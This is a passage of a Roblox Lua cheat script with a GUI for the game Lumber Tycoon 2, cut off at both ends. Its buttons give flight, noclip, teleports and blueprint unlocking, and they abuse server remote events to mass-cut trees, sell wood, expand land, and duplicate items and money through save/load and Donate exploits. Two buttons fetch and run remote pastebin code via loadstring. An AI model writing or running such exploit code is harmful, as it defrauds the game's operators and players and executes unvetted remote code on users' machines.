	bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
	until not flying
	ctrl = {f = 0, b = 0, l = 0, r = 0}
	lastctrl = {f = 0, b = 0, l = 0, r = 0}
	speed = 0
	bg:Destroy()
	bv:Destroy()
	plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
	if key:lower() == "w" then
	ctrl.f = 1
	elseif key:lower() == "s" then
	ctrl.b = -1
	elseif key:lower() == "a" then
	ctrl.l = -1
	elseif key:lower() == "d" then
	ctrl.r = 1
	 
	end
	end)
	mouse.KeyUp:connect(function(key)
	if key:lower() == "w" then
	ctrl.f = 0
	elseif key:lower() == "s" then
	ctrl.b = 0
	elseif key:lower() == "a" then
	ctrl.l = 0
	elseif key:lower() == "d" then
	ctrl.r = 0
	end
	end)
	FlyFunction()
		end
	end)

--Car Flight

CarFlight.MouseButton1Down:connect(function()
repeat wait()
until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local mouse = game.Players.LocalPlayer:GetMouse()
repeat wait() until mouse
local plr = game.Players.LocalPlayer
local torso = plr.Character.Torso
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 500
local speed = 0

function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0.1,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()
plr.Character.Humanoid.PlatformStand = false
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+125.0+(speed/maxspeed)
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-250
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()
plr.Character.Humanoid.PlatformStand = false
end
mouse.KeyDown:connect(function(key)
if key:lower() == "z" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
end
wait(5)
end)
end)

--Infinite Jump

local toggle = false
	InfJump.MouseButton1Click:Connect(function()
		toggle = not toggle
		InfJump.TextColor3 = (toggle and Color3.fromRGB(85, 255, 127) or Color3.fromRGB(255,255,255))
		if toggle then
			InfiniteJumpEnabled = true
		game:GetService("UserInputService").JumpRequest:connect(function()
		if InfiniteJumpEnabled then
			game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
			InfiniteJumpEnabled = true
		end
	end)
	
		else
				InfiniteJumpEnabled = false
	       game:GetService("UserInputService").JumpRequest:connect(function()
		if InfiniteJumpEnabled then
			game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
			
		end
	end)
		end
	end)

--No Clip

	_G.noclip = false
	game:GetService('RunService').Stepped:connect(function()
	if noclip then
	game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
	NoClip.TextColor3 = Color3.fromRGB(85, 255, 127)
	end
	end)
	NoClip.MouseButton1Down:connect(function()
	noclip = not noclip
	NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
	end)

--Ctrl+Click TP

TP.MouseButton1Down:connect(function()
local UIS = game:GetService("UserInputService")

local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()


function GetCharacter()
   return game.Players.LocalPlayer.Character
end

function Teleport(pos)
   local Char = GetCharacter()
   if Char then
       Char:MoveTo(pos)
   end
end


UIS.InputBegan:Connect(function(input)
   if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
       Teleport(Mouse.Hit.p)
   end
end)
end)

--All BP's

AllBp.MouseButton1Click:Connect(function()
	for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
	local clone = v:Clone()
	clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
	end
end)

--Jesus

	local toggle = false
	jesus.MouseButton1Click:Connect(function()
		toggle = not toggle
		jesus.TextColor3 = (toggle and Color3.fromRGB(85, 255, 127) or Color3.fromRGB(255,255,255))
		if toggle then
			for index, water in pairs(game.Workspace.Water:GetChildren()) do
	   water.CanCollide = true
	end
		else
			for index, water in pairs(game.Workspace.Water:GetChildren()) do
	   water.CanCollide = false
	end
		end
	end)

--No Fog

NoFog.MouseButton1Down:connect(function()
	--Fog.BackgroundColor3 = Color3.new(0, 0, 0)
                      NoFog.TextColor3 = Color3.new(1, 1, 1)
game.Lighting.Changed:connect(function()
	game.Lighting.TimeOfDay = "12:00:00"
	game.Lighting.FogEnd = 9999
	game.Lighting.Brightness = 2
end)
end)

--Golden Axe

spawn(function()
	GAxe = false
	function GetAxe() --Gets your current axe thats equiped when called
	    if game.Players.LocalPlayer.Character:FindFirstChild("Tool") then
	        return game.Players.LocalPlayer.Character.Tool --returns the axe when found
	    else
	        return false --returns false when not equiped
	    end
	end
	 
	function GetDamage(Axe, TreeClass)-- Gets the right Damage of the axe and returns it if called to prevent killing yourself like gold axe
	    if Axe.ToolTip == "Basic Hatchet" then return 0.2
	    elseif Axe.ToolTip == "Plain Axe" then return 0.55
	    elseif Axe.ToolTip == "Steel Axe" then return 0.93
	    elseif Axe.ToolTip == "Hardened Axe" then return 1.45
	    elseif Axe.ToolTip == "Silver Axe" then return 1.6
	    elseif Axe.ToolTip == "Rukiryaxe" then return 1.68
	    elseif Axe.ToolTip == "Beta Axe of Bosses" then return 1.45
	    elseif Axe.ToolTip == "Alpha Axe of Testing" then return 1.5
	    elseif Axe.ToolTip == "Fire Axe" then
	        if TreeClass ~= "Volcano" then return 0.6 else return 6.35 end
	    elseif Axe.ToolTip == "End Times Axe" then
	        if TreeClass ~= "LoneCave" then return 1.58 else return 10000000 end
	    elseif Axe.ToolTip == "Candy Cane Axe" then return 0
	    elseif Axe.ToolTip == "Johiro" then return 1.8
	    elseif Axe.ToolTip == "Beesaxe" then return 1.4
	    elseif Axe.ToolTip == "CHICKEN AXE" then return 0.9
	    elseif Axe.ToolTip == "Amber Axe" then return 3.39
	    elseif Axe.ToolTip == "The Many Axe" then return 10.2
	    elseif Axe.ToolTip == "Gingerbread Axe" then
	        if TreeClass == "Walnut" then return 8.5
	    elseif TreeClass == "Koa" then return 11 else return 1.2 end
	    elseif Axe.ToolTip == "Bird Axe" then
	        if TreeClass == "Volcano" then return 2.5 elseif TreeClass == "CaveCrawler" then return 3.9 else return 1.65 end
	    end
	end
	 
	 
	function GCut(TreePart) --Cuts the tree when called with the tree you want to cut
	    if GetAxe() ~= false then --checks if you have a axe equiped
	        Damage = GetDamage(GetAxe(), TreePart.Parent.TreeClass.Value) --gets the Damage
	        Height = TreePart.CFrame:pointToObjectSpace(mouse.Hit.p).Y + TreePart.Size.Y/2 --Gets the Height
	        local CutArguments = {
	            sectionId = TreePart.ID.Value,
	            faceVector = Vector3.new(0,0,-1),
	            height = Height,
	            hitPoints = Damage,
	            cooldown = 0,
	            cuttingClass = "Axe",
	            tool = GetAxe()
	        }
	        for i=1, 50 do
	            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(TreePart.Parent.CutEvent, CutArguments)
	        end
	    end
	end
	 
	function CutTree(Tree) --Cuts the tree when called with the tree you want to cut
	    if GetAxe() ~= false then --checks if you have a axe equiped
	        Damage = GetDamage(GetAxe(), Tree.TreeClass.Value) --gets the Damage
	        local CutArguments = {
	            sectionId = 1,
	            faceVector = Vector3.new(0,0,-1),
	            height = 0.5,
	            hitPoints = Damage,
	            cooldown = 0,
	            cuttingClass = "Axe",
	            tool = GetAxe()
	        }
	        for i=1, 50 do
	            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(Tree.CutEvent, CutArguments)
	        end
	    end
	end
	 
	TreeList = {} --Creates a table of the trees
	for a,b in pairs(workspace:GetChildren()) do
	    if b.name == "TreeRegion" then
	        b.ChildAdded:Connect(function(NewTree)--Creates functions that Adds new trees to the list
	            table.insert(TreeList, NewTree)
	        end)
	        for c,d in pairs(b:GetChildren()) do-- Adds the trees when first time starting the script
	            if d.Name == "Model" then
	                table.insert(TreeList, d)
	            end
	        end
	    end
	end
	 
	spawn(function() --used spawn so it wont interrupt any of the other things
	CutEnabled = false
	while wait(.5) do --Main loop to do the stuff
	    if CutEnabled == true then
	        if GetAxe() ~= false then --Checks if you have a axe equiped
	            for a,b in pairs(TreeList) do
	                if not b:FindFirstChild("RootCut") and b:FindFirstChild("CutEvent") then --Checks if the tree is already cut
	                    distance = (game.Players.LocalPlayer.Character.Head.Position - b.WoodSection.Position).magnitude --gets the distance between player and tree
	                    if distance < 225 then --if distance lower than 225 then it will cut the tree
	                        CutTree(b) --Calls the function with the tree to cut
	                    end
	                else
	                    table.remove(TreeList, a)--if tree already cut then it gets removed from the list
	                end
	            end
	        end
	    end
	end
	end)
	 
	mouse = game.Players.LocalPlayer:GetMouse() --Gets the Mouse
	mouse.Button1Down:connect(function()
	    if GAxe == true and GetAxe() ~= false then
	        Target = mouse.Target
	        GCut(Target)
	    end
	end)
	--Credits to Johiro, if you decide to skid atleast give credits
	end)
	GoldenAxe.MouseButton1Down:connect(function()
	
	    if GAxe == true then
	        GAxe = false
	GoldenAxe.TextColor3 = Color3.fromRGB(255, 255, 255)
	    elseif GAxe == false then
	        GAxe = true
	GoldenAxe.TextColor3 = Color3.fromRGB(85, 255, 127)
	--Credits to Johiro
	    end
	end)

--Paint

Paint.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/3Bk4KVYq',true))()
end)

--Fast Delete BP's

FastDelBps.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/1YR8cpNE", true))()
end)

--Reset Character

ResetCharacter.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.Head:Destroy()
end)

--Secret Walkspeed

SecretWalkSpeed.MouseButton1Down:connect(function()
	local walkspeedplayer = game:GetService("Players").LocalPlayer
	local walkspeedmouse = walkspeedplayer:GetMouse()
	
	local walkspeedenabled = false
	
	function x_walkspeed(key)
		if (key == "x") then
			if walkspeedenabled == false then
				_G.WS = 200;
				local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
				Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
				Humanoid.WalkSpeed = _G.WS;
				end)
				Humanoid.WalkSpeed = _G.WS;
				
				walkspeedenabled = true
			elseif walkspeedenabled == true then
				_G.WS = 20;
				local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
				Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
				Humanoid.WalkSpeed = _G.WS;
				end)
				Humanoid.WalkSpeed = _G.WS;
				
				walkspeedenabled = false
			end
		end
	end
	
	walkspeedmouse.KeyDown:connect(x_walkspeed)
	
end)

--Sell Wood

SellWood.MouseButton1Down:connect(function()
            for _, Log in pairs(workspace.LogModels:GetChildren()) do
        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
            if Log.Owner.Value == game.Players.LocalPlayer then
                for i,v in pairs(Log:GetChildren()) do
                    if v.Name=="WoodSection" then
                        spawn(function()
                            for i=1,10 do
                                wait()
                                v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
                            end
                        end)
                    end
                end
                spawn(function()
                    for i=1,20 do
                        wait()
                        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
                    end
                end)
            end
        end
    end
end)

--Sell Planks

SellPlanks.MouseButton1Click:Connect(function()
	for _, Plank in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if Plank.Name=="Plank" and Plank:findFirstChild("Owner") then
			if Plank.Owner.Value == game.Players.LocalPlayer then
				for i,v in pairs(Plank:GetChildren()) do
					if v.Name=="WoodSection" then
						spawn(function()
							for i=1,10 do
								wait()
								v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
							end
						end)
					end
				end
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
					end
				end)
			end
		end
	end
end)

--TP Wood

TPWood.MouseButton1Click:Connect(function()
    for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
            if Log.Owner.Value == game.Players.LocalPlayer then
                Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 20, 0))
                for i=1,100 do
                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
                end
            end
        end
    end
end)

--TP Planks

TPPlanks.MouseButton1Click:Connect(function()
	for _, Plank in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if Plank.Name=="Plank" and Plank:findFirstChild("Owner") then
			if Plank.Owner.Value == game.Players.LocalPlayer then
				sendNotice = game.ReplicatedStorage.Notices.SendUserNotice
				sendNotice:Fire("Click where you want ALL the Planks to TP to")
				local ButtonPress
				ButtonPress = game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
					Square = game.Players.LocalPlayer:GetMouse().Target
					if (Square.Name == "OriginSquare" or Square.Name == "Square") then
						ButtonPress:Disconnect()
						Plank:MoveTo(Square.Position)
						for i=1,100 do
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
						end
					end
				end)
			end
		end
	end
end)

--Mod Wood

ModWood.MouseButton1Click:Connect(function()
	           for _, Log in pairs(workspace.LogModels:GetChildren()) do
	        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
	            if Log.Owner.Value == game.Players.LocalPlayer then
	                for i,v in pairs(Log:GetChildren()) do
	                    if v.Name=="WoodSection" then
	                        spawn(function()
	                            for i=1,10 do
	                                wait()
	                                v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
	                            end
	                        end)
	                    end
	                end
	                spawn(function()
	                    for i=1,20 do
	                        wait()
	                        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
	            game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
	                    end
	                end)
	            end
	        end
	    end
	wait(2.0)
	    for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
	        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
	            if Log.Owner.Value == game.Players.LocalPlayer then
	                Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
	                for i=1,20 do
	                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
	                    game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
	                end
	            end
	        end
	    end
end)

--Remove Tree's

RemoveTrees.MouseButton1Click:Connect(function()
	for i,v in pairs(game.Workspace:GetDescendants()) do
	    if v.Name == "WoodSection" and v.Parent:FindFirstChild("CutEvent") then
	        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
	        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v.Parent)
	    end
	end
	game.Workspace.DescendantAdded:connect(function(Thing)
	    wait(0.1)
	    if Thing.Name == "WoodSection" and Thing.Parent:FindFirstChild("CutEvent") then
	        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Thing.Parent)
	        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(Thing.Parent)
	    end
	end)
	end)

--Wood R Us

StoreWoodRUs.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(265, 5, 57))
end)

--Link's Logic

StoreLogic.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(4607, 9, -798))
end)

--Spawn

Spawn.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(155, 5, 74))
end)

--Ice Wood

IceWood.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(1451.66248, 412.208405, 3183.47607))
end)

--Land Store

StoreLand.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(258, 5, -99))
end)

--Fine Arts

StoreFineArts.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(5207, -156, 719))
end)


--Volcano

Volcano.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(-1585, 625, 1140))
end)

--Palm

Palm.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(2549, 5, -42))
end)

--Boxed Cars

StoreCars.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(509, 5.2, -1463))
end)

--Bob's Shack

StoreBobs.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(260, 10, -2542))
end)

--Swamp

Swamp.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(-1209, 138, -801))
end)

--End Times

EndTimes.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(113, -204, -951))
end)

--Fancy Furnishings

StoreFancy.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(491, 13, -1720))
end)

--Strange Man

StrangeMan.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(1061, 20, 1131))
end)

--Yellow Wood

YellowWood.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(-1124.91565, 1.10021782, -943.932129))
end)

--Cave

Cave.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(3581, -177, 430))
end)

--Green Box

GreenBox.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(-1668.39197, 349.601929, 1475.36255))
end)

--Lodge

Lodge.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(1244, 66, 2306))
end)

--Dock

Dock.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(1114, 3.2, -197))
end)

--Bridge

Bridge.MouseButton1Down:connect(function()
function Tlprt(Cframe)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Cframe
end
Tlprt(CFrame.new(113, 15, -977))
end)

--Dupe Step 1

DupeStep1.MouseButton1Click:Connect(function()
	ScriptLoadOrSave = true
	local CheckSlot = CheckSlotNumber2()
	if CheckSlot ~= false then
		if CheckIfSlotAvailable(CheckSlot) == true then
			local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(CheckSlot)
			if LoadSlot == false then
				SendNotification("Cooldown Notification", "You aren't abled to load now", 1)
			end
			if LoadSlot == true then 
				SendNotification("Reload Notification", "Loaded Your Slot", 2)
				CurrentSlot = CheckSlot
			end
		else
			SendNotification("Slot not Available", "This Slot is not Available, please choose another slot", 2)
		end
	else
		SendNotification("Incorrect Slot", "Enter a Valid number in the upper field", 1)
	end
	ScriptLoadOrSave = false
end)

--Dupe Step 2

DupeStep2.MouseButton1Click:Connect(function()
	ScriptLoadOrSave = true
	local CheckSlot = CheckSlotNumber2()
	if CheckSlot ~= false then
		if CheckIfSlotAvailable(CheckSlot) == true then
			local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(CheckSlot)
			if LoadSlot == false then
				SendNotification("Cooldown Notification", "You aren't abled to load now", 1)
			end
			if LoadSlot == true then 
				SendNotification("Reload Notification", "Loaded Your Slot", 2)
				CurrentSlot = CheckSlot
			end
		else
			SendNotification("Slot not Available", "This Slot is not Available, please choose another slot", 2)
		end
	else
		SendNotification("Incorrect Slot", "Enter a Valid number in the upper field", 1)
	end
	ScriptLoadOrSave = false
end)

--Money Step 1

MoneyStep1.MouseButton1Click:Connect(function()

	local CheckSlot = CheckSlotNumber1()
	if CheckSlot ~= false then
		if CurrentSlot ~= -1 then
			ScriptLoadOrSave = true
			local SaveSlot = game.ReplicatedStorage.LoadSaveRequests.RequestSave:InvokeServer(CheckSlot)
			if SaveSlot == true then
				SendNotification("Save Notification", "Saved your Slot", 2)
				wait(.5)
				ScriptLoadOrSave = false
			elseif SaveSlot == false then
				SendNotification("Already Saving", "Saving/Loading is currently in Progress", 1)
				wait(.5)
				ScriptLoadOrSave = false
			end
		else
			SendNotification("Error", "Load Your Slot First before saving", 1)
		end
	else
		SendNotification("Incorrect Slot", "Enter a number in the upper field", 1)
	end
wait(3)

	if MoneyCooldown == true then
		SendNotification("Cooldown Notification", "Wait for your Money to come back",2)
		return
	elseif MoneyCooldown == false then
		MoneyCooldown = true
		SendNotification("Money Sent", "Wait about 2 minutes for your Money to come back", 5)
		game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
		SendNotification("Money Received", "You received your money that you have sent earlier", 5)
		MoneyCooldown = false
	end
end)

--Money Step 2

MoneyStep2.MouseButton1Click:Connect(function()
		ScriptLoadOrSave = true
	local CheckSlot = CheckSlotNumber1()
	if CheckSlot ~= false then
		if CheckIfSlotAvailable(CheckSlot) == true then
			local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(CheckSlot)
			if LoadSlot == false then
				SendNotification("Cooldown Notification", "You aren't abled to load now", 1)
			end
			if LoadSlot == true then 
				SendNotification("Reload Notification", "Loaded Your Slot", 2)
				CurrentSlot = CheckSlot
			end
		else
			SendNotification("Slot not Available", "This Slot is not Available, please choose another slot", 2)
		end
	else
		SendNotification("Incorrect Slot", "Enter a Valid number in the upper field", 1)
	end
	ScriptLoadOrSave = false
end)

--Axe Store Axes

StoreAxes.MouseButton1Down:connect(function() --Stores the Axes somewhere so you can restore them later
	Amount = 0
	for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
		if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
			b.Parent = game.Players.LocalPlayer
			Amount = Amount + 1
		end
	end
	SendNotification("Store Notification", "Stored "..Amount.." Axes, you can restore them later", 2)
end)

--Axe Restore Axes

RestoreAxes.MouseButton1Down:connect(function() --Restores the axes that you stored with the Store function
	Amount = 0
	for a,b in pairs(game.Players.LocalPlayer:GetChildren()) do
		if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
			b.Parent = game.Players.LocalPlayer.Backpack
			Amount = Amount + 1
		end
	end
	SendNotification("Restore Notification", "Restored "..Amount.." Axes that you Stored", 2)
end)

--Axe Count Axes

CountAxes.MouseButton1Down:connect(function() --Counts Axes in your Backpack (Equiped Axes dont Count)
	Amount = 0
	for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if b.Name ~= "BlueprintTool" and b.Name == "Tool" then
			Amount = Amount + 1
		end
	end
	SendNotification("Axe Amount", "You have "..Amount.." Axes in your Backpack",2)
end)

--Maxland

MaxLand.MouseButton1Down:Connect(function()
for i, v in pairs(game:GetService("Workspace").Properties:GetChildren()) do
        if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
            base = v
            square = v.OriginSquare
            end
        end
    function makebase(pos)
        local Event = game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty
        Event:FireServer(base, pos)
        end
    spos = square.Position
    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
    makebase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
    makebase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
    makebase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
    makebase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
--Corners--
    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
--Corners--
    makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
    makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
    makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
    makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
